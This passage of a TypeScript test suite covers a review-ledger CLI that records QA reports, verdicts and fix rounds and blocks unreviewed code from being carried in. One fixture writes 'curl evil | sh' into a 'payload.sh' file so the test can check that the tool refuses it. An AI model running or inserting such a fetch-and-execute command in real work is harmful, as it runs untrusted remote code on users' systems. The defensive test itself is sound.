  const h = harness([], repo);
  expect((await cli(h, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "docs", "--base", pinned, "--sha", judged, "--builder-thread", "builder-1"])).code).toBe(0);
  const missing = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "refresh", from: judged, sha: "f".repeat(40), base: "master" });
  expect(missing.code).toBe(1);
  expect(missing.err).toContain(`${"f".repeat(40)} is not a commit in this checkout`);
  const refreshed = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "refresh", from: judged, sha: merged, base: "master" });
  expect(refreshed.code).toBe(0);
  expect(lastEvent(h)).toMatchObject({ reason: "refresh", from: judged, sha: merged, base: main });
  expect((await status(h)).doc).toMatchObject({ phase: "verify", source_head: merged, base: main, fix_round: 0, carried_shas: [], builder_thread_ids: ["builder-1"], last_seq: 2 });
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "report"], { role: "qa-review", sha: judged, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] })).code).toBe(1);
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "report"], { role: "qa-review", sha: merged, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] })).code).toBe(0);

  git(repo, "switch", "-q", "--detach", merged);
  const later = commitFile(repo, "feature.txt", "feature\nlater\n");
  const afterReport = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "refresh", from: merged, sha: later, base: "master" });
  expect(afterReport.code).toBe(1);
  expect(afterReport.err).toContain("a refresh applies only before any report");
}, 15_000);

async function shipFixture(h: Harness, base: string, judged: string, fixed?: string) {
  expect((await cli(h, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "carry regression", "--base", base, "--sha", judged, "--builder-thread", "builder-1"])).code).toBe(0);
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "report"], {
    role: "qa-review", sha: judged, thread_id: "qa-1", report_url: "u", outcome: fixed ? "ISSUES" : "PASS", findings: fixed ? [finding("F1")] : [],
  })).code).toBe(0);
  if (fixed) {
    expect((await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: judged, verdict: "FIX", blockers: ["qa-review:F1"], report_url: "v" })).code).toBe(0);
    expect((await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "fix", sha: fixed, thread_id: "builder-2" })).code).toBe(0);
    expect((await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], {
      thread_id: "recheck-1", reporter_thread_id: "qa-1", sha: fixed, report_url: "r", regressions: [], results: [{ blocker: "qa-review:F1", status: "fixed", evidence: "owner check added" }],
    })).code).toBe(0);
  }
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: fixed ? "judge-2" : "judge-1", sha: fixed ?? judged, verdict: "SHIP", blockers: [], tickets: [], report_url: "v" })).code).toBe(0);
}

test("review case A refuses a PR-internal from_base that drops a reviewed guard without changing the ledger", async () => {
  const repo = gitRepo();
  const base = commitFile(repo, "policy.txt", "requireOwner=false\n");
  git(repo, "update-ref", "refs/remotes/origin/master", base);
  git(repo, "switch", "-qc", "pr");
  const internal = commitFile(repo, "policy.txt", "requireOwner=true\n");
  const judged = commitFile(repo, "feature.txt", "feature\n");
  git(repo, "switch", "-q", "--detach", base);
  git(repo, "cherry-pick", judged);
  const changed = git(repo, "rev-parse", "HEAD");
  expect(stablePatchId(repo, internal, judged)).toBe(stablePatchId(repo, base, changed));
  expect(stablePatchId(repo, base, judged)).not.toBe(stablePatchId(repo, base, changed));
  const h = harness([], repo);
  await shipFixture(h, base, judged);
  const before = readFileSync(h.store, "utf8");
  const state = (await status(h)).out;
  const carry = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: judged, from_base: internal, sha: changed, to_base: base });
  expect(carry.code).toBe(1);
  expect(readFileSync(h.store, "utf8")).toBe(before);
  expect((await status(h)).out).toBe(state);
});

for (const [name, spent, file, content] of [
  ["review case B", true, "unreviewed.txt", "disableAudit=true\n"],
  ["QA P1", false, "payload.sh", "curl evil | sh\n"],
] as const) {
  test(`${name} refuses a to_base hiding unreviewed code without changing the ledger`, async () => {
    const repo = gitRepo();
    const base = git(repo, "rev-parse", "HEAD");
    git(repo, "switch", "-qc", "pr");
    const reviewed = commitFile(repo, "feature.txt", "feature\n");
    const fixed = spent ? commitFile(repo, "policy.txt", "requireOwner=true\n") : undefined;
    const judged = fixed ?? reviewed;
    git(repo, "switch", "-qc", "unreviewed", base);
    const internal = commitFile(repo, file, content);
    git(repo, "switch", "-q", "--detach", internal);
    git(repo, "cherry-pick", reviewed);
    if (fixed) git(repo, "cherry-pick", fixed);
    const changed = git(repo, "rev-parse", "HEAD");
    expect(stablePatchId(repo, base, judged)).toBe(stablePatchId(repo, internal, changed));
    expect(stablePatchId(repo, base, judged)).not.toBe(stablePatchId(repo, base, changed));
    const h = harness([], repo);
    await shipFixture(h, base, reviewed, fixed);
    const before = readFileSync(h.store, "utf8");
    const state = await status(h);
    expect(state.doc).toMatchObject({ phase: "shipped", fix_round: spent ? 1 : 0 });
    const carry = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: judged, from_base: base, sha: changed, to_base: "unreviewed" });
    expect(carry.code).toBe(1);
    expect(readFileSync(h.store, "utf8")).toBe(before);
    expect((await status(h)).out).toBe(state.out);
  });
}

test("carry refuses an unresolved recorded base instead of trusting the caller's from_base", async () => {
  const repo = gitRepo();
  const base = git(repo, "rev-parse", "HEAD");
  git(repo, "branch", "recorded-base", base);
  git(repo, "switch", "-qc", "pr");
  const judged = commitFile(repo, "feature.txt", "feature\n");
  git(repo, "switch", "-q", "master");
  const main = commitFile(repo, "unrelated.txt", "main moved on\n");
  git(repo, "update-ref", "refs/remotes/origin/master", main);
  git(repo, "cherry-pick", judged);
  const changed = git(repo, "rev-parse", "HEAD");
  const h = harness([], repo);
  await shipFixture(h, "recorded-base", judged);
  git(repo, "branch", "-D", "recorded-base");
  const before = readFileSync(h.store, "utf8");
  const carry = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: judged, from_base: base, sha: changed, to_base: main });
  expect(carry.code).toBe(1);
  expect(readFileSync(h.store, "utf8")).toBe(before);
});

test("statusOf reports a missing ledger as absent, not as a round", () => {
  const doc = statusOf({ state: null, last_seq: 0, accepted: [], rejected: [] }, CHANGE);
  expect(doc.ledger).toBe("absent");
  expect(doc.phase).toBeNull();
  expect(doc.fix_round).toBe(0);
});

test("prompts name only the current phase's role and carry the head", () => {
  const s: State = {
    ticket: TICKET, change_url: CHANGE, rigor: "standard", rigor_reason: "runtime", base: BASE, head: H1, carried: [], phase: "verify",
    builder_threads: ["b"], judge_threads: [], reports: {}, recheck: null, fix_round: 0, fix: null, verdict: null,
  };
  expect(prompt(s, CHANGE, "qa")).toContain(H1);
  expect(() => prompt(s, CHANGE, "judge")).toThrow(/runs in phase judge/);
  expect(prompt(s, CHANGE, "review")).toContain("independent code reviewer");
});

test("a relocated prompt records through its own executable path", async () => {
  const h = harness();
  expect((await initPr(h)).code).toBe(0);
  const movedDir = join(h.dir, "an agent's plugin");
  mkdirSync(movedDir);
  const movedCli = join(movedDir, "ship-loop.ts");
  writeFileSync(movedCli, readFileSync(CLI));
  const env = { ...process.env, HOME: h.dir, SHIP_LOOP_ENTIRE: FAKE_ENTIRE, SHIP_LOOP_GH: FAKE_GH, SHIP_LOOP_FAKE_STORE: h.store };
  const generated = Bun.spawn(["bun", movedCli, "prompt", "--change", CHANGE, "--role", "qa"], {
    env, stdout: "pipe", stderr: "pipe",
  });
  const [brief, error, generatedCode] = await Promise.all([
    new Response(generated.stdout).text(), new Response(generated.stderr).text(), generated.exited,
  ]);
  expect(generatedCode, error).toBe(0);
  expect(brief).toContain("the `verification` skill");
  const command = brief.match(/`(bun .*? record --change \S+ --kind report --file) <payload.json>`/);
  if (!command) throw new Error("generated brief has no executable report command");
  const payload = join(h.dir, "report.json");
  writeFileSync(payload, JSON.stringify({
    role: "qa", sha: H1, thread_id: "relocated-qa", report_url: CHANGE, outcome: "PASS", findings: [],
  }));
  const recorded = Bun.spawn(["sh", "-c", `${command[1]} '${payload}'`], {
    env, stdout: "pipe", stderr: "pipe",
  });
  const [recordOut, recordError, recordCode] = await Promise.all([
    new Response(recorded.stdout).text(), new Response(recorded.stderr).text(), recorded.exited,
  ]);
  expect(recordCode, recordError || recordOut).toBe(0);
  expect((await status(h)).doc.review_thread_ids).toContain("relocated-qa");
});

// ---- the Entire cutover: pre-cutover v1 ledgers, change identity, trust anchor, visibility and resolution ----

// hundred#8's shape: the change's branch backs a pull request whose author's comments hold a v1 round after a
// bot summary and a written report, so the round starts on the second page of comments.
const V1_URL = "https://github.com/misty-step/example/pull/12";
const v1Pull = (over: Partial<Pull> = {}): Pull => ({
  number: 12, url: V1_URL, state: "OPEN", headRefName: "feature", isCrossRepository: false, author: "moomooskycow",
  comments: [
    { login: "coderabbitai[bot]", body: "<!-- coderabbit-ai-generated:v1 -->" },
    { login: "moomooskycow", body: "## Independent QA/review — PASS" },
    { login: "moomooskycow", body: `${MARKER}\n\`\`\`json\n{"v": 1, "kind": "init", "seq": 1}\n\`\`\`\n` },
  ],
  ...over,
});

test("a backing pull request's v1 comment ledger stops every command instead of reading as round 0", async () => {
  const h = harness();
  edit(h, (s) => s.pulls.push(v1Pull()));
  for (const args of [["status", "--change", CHANGE, "--json"], ["prompt", "--change", CHANGE, "--role", "qa"], initArgs(CHANGE)]) {
    const r = await cli(h, args);
    expect(r.code, r.err).toBe(2);
    expect(r.out).toBe("");
    expect(r.err).toContain(`backing pull request ${V1_URL} (OPEN) holds a v1 ship-loop ledger`);
    expect(r.err).toContain(`at ${FROZEN_V1}: \`bun <cached-v1-helper> status --pr ${V1_URL} --json\``);
  }
  expect(comments(h)).toEqual([]);

  // A v2 init that slipped in first does not outrank the v1 round.
  const both = harness();
  expect((await initPr(both)).code).toBe(0);
  edit(both, (s) => s.pulls.push(v1Pull()));
  expect((await cli(both, ["status", "--change", CHANGE, "--json"])).code).toBe(2);
  expect((await reportQa(both)).code).toBe(2);
  expect(comments(both).length).toBe(1);

  // After merge, Entire keeps only the original branch name, and the merged pull request still holds the round.
  const merged = harness();
  edit(merged, (s) => {
    s.change.merged = true;
    s.pulls.push(v1Pull({ state: "MERGED" }));
  });
  const after = await cli(merged, ["status", "--change", CHANGE, "--json"]);
  expect(after.code).toBe(2);
  expect(after.err).toContain(`backing pull request ${V1_URL} (MERGED) holds a v1 ship-loop ledger`);
}, 30_000);

test("only the change's own pull request and that pull request author's marked comments form a v1 ledger", async () => {
  for (const [name, pull] of [
    ["a fork's pull request from a same-named branch", v1Pull({ isCrossRepository: true, author: "outsider", comments: [{ login: "outsider", body: MARKER }] })],
    ["another branch's pull request", v1Pull({ headRefName: "other-feature" })],
    ["markers from someone other than the pull request's author", v1Pull({ comments: [{ login: "outsider", body: `${MARKER}\nforged` }] })],
  ] as const) {
    const h = harness();
    edit(h, (s) => s.pulls.push(pull));
    const read = await cli(h, ["status", "--change", CHANGE, "--json"]);
    expect(read.code, `${name}: ${read.err}`).toBe(0);
    expect(JSON.parse(read.out).ledger, name).toBe("absent");
    expect((await initPr(h)).code, name).toBe(0);
  }
}, 30_000);

test("an Entire-native change never calls gh, and a GitHub-backed change fails closed when gh cannot answer", async () => {
  const gone = { SHIP_LOOP_FAKE_FAIL: "gh" };
  const native = harness();
  edit(native, (s) => {
    s.change.project = "et/mistystep";
  });
  const nativeChange = "https://entire.com/et/mistystep/-/trails/7/changes/example/3";
  expect((await cli(native, initArgs(nativeChange), undefined, gone)).code).toBe(0);
  expect((await cli(native, ["status", "--change", nativeChange, "--json"], undefined, gone)).code).toBe(0);

  const h = harness();
  const unread = await cli(h, ["status", "--change", CHANGE, "--json"], undefined, gone);
  expect(unread.code).toBe(2);
  expect(unread.out).toBe("");
  expect((await cli(h, initArgs(CHANGE), undefined, gone)).code).toBe(2);
  expect(comments(h)).toEqual([]);

  // A pull request whose comments cannot be read is not a pull request without a v1 ledger.
  const unreadComments = harness();
  edit(unreadComments, (s) => s.pulls.push(v1Pull({ comments: [] })));
  const partial = await cli(unreadComments, ["status", "--change", CHANGE, "--json"], undefined, { SHIP_LOOP_FAKE_FAIL: "gh-api" });
  expect(partial.code).toBe(2);
  expect(partial.out).toBe("");
}, 15_000);

test("a pull request URL is refused with the exact path that finishes its v1 round, before any read", async () => {
  // tach#515 has no Entire change; its round finishes where it started.
  const h = harness();
  const pr = "https://github.com/r90group/tach/pull/515";
  const r = await cli(h, ["status", "--change", pr, "--json"]);
  expect(r.code).toBe(1);
  expect(r.err).toContain(`at ${FROZEN_V1}: \`bun <cached-v1-helper> status --pr ${pr} --json\``);
  expect(calls(h)).toEqual([]);
});

test("every documented change URL form resumes one ledger under the canonical change URL", async () => {
  const h = harness();
  const repoForm = "https://entire.com/gh/misty-step/example/-/trails/7/changes/3";
  const shortForm = "https://entire.com/gh/misty-step/example/trails/3";
  expect((await cli(h, initArgs(shortForm))).code).toBe(0);
  for (const form of [CHANGE, repoForm, shortForm]) {
    const read = await cli(h, ["status", "--change", form, "--json"]);
    expect(read.code, read.err).toBe(0);
    expect(JSON.parse(read.out)).toMatchObject({ change: CHANGE, phase: "verify", last_seq: 1 });
    const resumed = await cli(h, initArgs(form));
    expect(resumed.code, resumed.err).toBe(0);
    expect(resumed.out).toContain("no reset");
  }
  const report = await cli(h, ["record", "--change", repoForm, "--kind", "report"], { role: "qa", sha: H1, thread_id: "qa-1", report_url: CHANGE, outcome: "PASS", findings: [] });
  expect(report.code, report.err).toBe(0);
  expect(comments(h).length).toBe(2);
  // The brief records through the canonical URL and names the change for findings, so they work from a detached checkout.
  const brief = await cli(h, ["prompt", "--change", shortForm, "--role", "review"]);
  expect(brief.code, brief.err).toBe(0);
  expect(brief.out).toContain("`entire trail finding add --trail example/3 --project gh/misty-step --severity");
  expect(brief.out).toContain(`record --change ${CHANGE} --kind report`);
}, 30_000);

test("a change URL naming another parent trail is refused before any write", async () => {
  const h = harness();
  for (const wrong of ["https://entire.com/gh/misty-step/-/trails/999/changes/example/3", "https://entire.com/gh/misty-step/example/-/trails/999/changes/3"]) {
    const read = await cli(h, ["status", "--change", wrong, "--json"]);
    expect(read.code).toBe(1);
    expect(read.err).toContain("--change names trail 999, but change example/3 is on trail 7");
    expect((await cli(h, initArgs(wrong))).code).toBe(1);
  }
  expect(comments(h)).toEqual([]);
}, 15_000);

test("the change's author, not its trail's author, writes the ledger, and an unknown author stops every write", async () => {
  // review:F8 on 0.12.2: `trail show` names the parent trail's author; the finding listing names the change's own.
  const h = harness();
  edit(h, (s) => {
    s.trail_author = "ticket-author";
  });
  expect((await initPr(h)).code).toBe(0);
  expect((await reportQa(h)).code).toBe(0);
  expect((await status(h)).doc).toMatchObject({ ledger: "present", last_seq: 2, review_thread_ids: ["qa-1"] });

  // Entire names no author for a bot-published change: nothing is read as a round, and nothing is written.
  const unknown = harness();
  edit(unknown, (s) => {
    s.change.author = null;
    s.trail_author = "conductor";
  });
  for (const args of [["status", "--change", CHANGE, "--json"], initArgs(CHANGE)]) {
    const r = await cli(unknown, args, undefined, { SHIP_LOOP_FAKE_ACTOR: "conductor" });
    expect(r.code).toBe(2);
    expect(r.out).toBe("");
  }
  expect(comments(unknown)).toEqual([]);
}, 15_000);

test("a push that stales earlier events, or a dismissed event, never resets the round", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [finding("F1")]);
  await reportReview(h);
  // A new push marks every earlier finding stale, which Entire's default list hides; someone also dismisses the QA event.
  edit(h, (s) => {
    s.version++;
    s.findings.find((f) => f.body.includes('"role": "qa"'))!.status = "dismissed";
  });
  expect((await status(h)).doc).toMatchObject({ ledger: "present", phase: "judge", last_seq: 3, review_thread_ids: ["qa-1", "review-1"] });
  expect((await initPr(h)).out).toContain("no reset");
  const fix = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: H1, verdict: "FIX", blockers: ["qa:F1"], report_url: "https://example.test/v" });
  expect(fix.code, fix.err).toBe(0);
  expect((await status(h)).doc).toMatchObject({ phase: "fix", fix_round: 1, last_seq: 4 });
}, 15_000);

test("every finding call names the change, and every ledger read asks for each status, dismissed and stale findings", async () => {
  // An explicit CLI contract. On 0.12.2 `--include-dismissed` without `--status` already lists every status, so
  // dropping only `--status any` changes no behavior; this keeps the documented read explicit.
  const h = harness();
  await initPr(h);
  await reportQa(h);
  const findingCalls = calls(h).filter((c) => c[1] === "finding");
  const value = (c: string[], name: string) => (c.includes(name) ? c[c.indexOf(name) + 1] : undefined);
  expect(findingCalls.map((c) => c[2])).toEqual(expect.arrayContaining(["list", "add", "resolve"]));
  for (const c of findingCalls) expect([value(c, "--trail"), value(c, "--project")]).toEqual(["example/3", "gh/misty-step"]);
  for (const c of findingCalls.filter((c) => c[2] === "list")) {
    expect([value(c, "--status"), c.includes("--include-dismissed"), value(c, "--freshness")]).toEqual(["any", true, "any"]);
  }
});

test("a retry after a lost concurrent write is a new write at the next seq, and every event ends resolved", async () => {
  const h = harness();
  await initPr(h);
  // Another conductor's QA report lands at seq 2 just before this review report.
  const rival = renderWithKey({ v: 1, kind: "report", seq: 2, role: "qa", sha: H1, thread_id: "qa-1", report_url: "https://example.test/qa", outcome: "PASS", findings: [] });
  const lost = await reportReview(h, [], { SHIP_LOOP_FAKE_RACE: rival });
  expect(lost.code, lost.err).toBe(3);
  expect((await status(h)).doc).toMatchObject({ last_seq: 2, rejected_writes: 1, review_thread_ids: ["qa-1"] });
  const retried = await reportReview(h);
  expect(retried.code, retried.err).toBe(0);
  expect(retried.out).toContain("recorded at seq 3");
  expect((await status(h)).doc).toMatchObject({ phase: "judge", last_seq: 3, rejected_writes: 1, review_thread_ids: ["qa-1", "review-1"] });
  expect(comments(h).map((c) => c.status)).toEqual(["resolved", "resolved", "resolved", "resolved"]);
}, 15_000);

test("a failed resolve is never reported as success, and rerunning the same command resolves the event", async () => {
  const h = harness();
  const stuck = { SHIP_LOOP_FAKE_FAIL: "resolve" };
  const firstInit = await cli(h, initArgs(CHANGE), undefined, stuck);
  expect(firstInit.code).toBe(2);
  expect(firstInit.out).toBe("");
  expect(firstInit.err).toContain("is still open");
  expect(comments(h).map((c) => c.status)).toEqual(["open"]);
  const resumed = await initPr(h);
  expect(resumed.code, resumed.err).toBe(0);
  expect(resumed.out).toContain("no reset");
  expect(comments(h).map((c) => c.status)).toEqual(["resolved"]);

  expect((await reportQa(h, [], "PASS", stuck)).code).toBe(2);
  expect((await status(h)).doc.last_seq).toBe(2);
  const again = await reportQa(h, [], "PASS");
  expect(again.code, again.err).toBe(0);
  expect(again.out).toContain("already recorded at seq 2");
  expect(comments(h).map((c) => c.status)).toEqual(["resolved", "resolved"]);

  // A lost add response is confirmed on read-back, but only a resolved event is success.
  expect((await reportReview(h, [], { SHIP_LOOP_FAKE_FAIL: "post-after,resolve" })).code).toBe(2);
  expect(comments(h).map((c) => c.status)).toEqual(["resolved", "resolved", "open"]);
  const retried = await reportReview(h);
  expect(retried.code, retried.err).toBe(0);
  expect(comments(h).map((c) => c.status)).toEqual(["resolved", "resolved", "resolved"]);
}, 30_000);

// Render an event exactly as the CLI would: its content key covers everything except seq.
function renderWithKey(body: Record<string, unknown>): string {
  const { seq, key: _key, ...rest } = body;
  return renderEvent({ ...rest, seq, key: keyOf(rest) } as Event);
}
